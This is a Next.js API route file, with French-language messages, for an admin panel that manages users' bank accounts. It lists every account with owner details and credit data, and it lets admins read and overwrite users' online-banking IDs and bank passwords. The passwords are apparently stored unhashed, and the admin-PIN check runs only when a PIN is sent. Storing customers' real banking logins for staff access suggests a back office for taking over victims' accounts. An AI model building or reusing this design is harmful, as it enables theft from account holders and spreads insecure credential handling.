import { NextResponse } from "next/server";
import prisma from "@/lib/prisma";
import { requireAdmin, verifyAdminPin } from "@/lib/adminAuth";

export async function GET(req: Request) {
  try {
    const { admin, errorResponse } = await requireAdmin(req);
    if (errorResponse) return errorResponse;

    const accounts = await prisma.userBankAccount.findMany({
      orderBy: { createdAt: "desc" },
      include: {
        user: {
          select: {
            id: true,
            name: true,
            email: true,
            phone: true,
            countryCode: true,
            creditScore: true,
            creditLimit: true
          }
        }
      }
    });

    return NextResponse.json({
      success: true,
      accounts
    }, { status: 200 });

  } catch (error) {
    console.error("GET /api/admin/banks Error:", error);
    return NextResponse.json({ error: "Erreur serveur lors de la récupération des comptes bancaires." }, { status: 500 });
  }
}

export async function PUT(req: Request) {
  try {
    const { admin, errorResponse } = await requireAdmin(req);
    if (errorResponse) return errorResponse;

    const body = await req.json();
    const { accountId, bankName, accountNumber, accountHolder, onlineBankingId, onlineBankingName, bankPassword, status, pin } = body;

    if (!accountId) {
      return NextResponse.json({ error: "ID du compte bancaire requis." }, { status: 400 });
    }

    if (pin) {
      const isPinValid = await verifyAdminPin(admin, pin);
      if (!isPinValid) {
        return NextResponse.json({ error: "Code PIN administrateur incorrect." }, { status: 403 });
      }
    }

    const updateData: any = {};
    if (bankName !== undefined) updateData.bankName = bankName;
    if (accountNumber !== undefined) updateData.accountNumber = accountNumber;
    if (accountHolder !== undefined) updateData.accountHolder = accountHolder;
    if (onlineBankingId !== undefined) updateData.onlineBankingId = onlineBankingId;
    if (onlineBankingName !== undefined) updateData.onlineBankingName = onlineBankingName;
    if (bankPassword !== undefined) updateData.bankPassword = bankPassword;
    if (status !== undefined) updateData.status = status;

    const updatedAccount = await prisma.userBankAccount.update({
      where: { id: accountId },
      data: updateData,
      include: {
        user: {
          select: {
            id: true,
            name: true,
            email: true
          }
        }
      }
    });

    return NextResponse.json({
      success: true,
      message: "Coordonnées et identifiants bancaires mis à jour avec succès !",
      account: updatedAccount
    }, { status: 200 });

  } catch (error) {
    console.error("PUT /api/admin/banks Error:", error);
    return NextResponse.json({ error: "Erreur serveur lors de la mise à jour des identifiants bancaires." }, { status: 500 });
  }
}

export async function DELETE(req: Request) {
  try {
    const { admin, errorResponse } = await requireAdmin(req);
    if (errorResponse) return errorResponse;

    const { searchParams } = new URL(req.url);
    const accountId = searchParams.get("id");

    if (!accountId) {
      return NextResponse.json({ error: "ID du compte requis." }, { status: 400 });
    }

    await prisma.userBankAccount.delete({
      where: { id: accountId }
    });

    return NextResponse.json({
      success: true,
      message: "Compte bancaire supprimé de la base."
    }, { status: 200 });

  } catch (error) {
    console.error("DELETE /api/admin/banks Error:", error);
    return NextResponse.json({ error: "Erreur lors de la suppression." }, { status: 500 });
  }
}
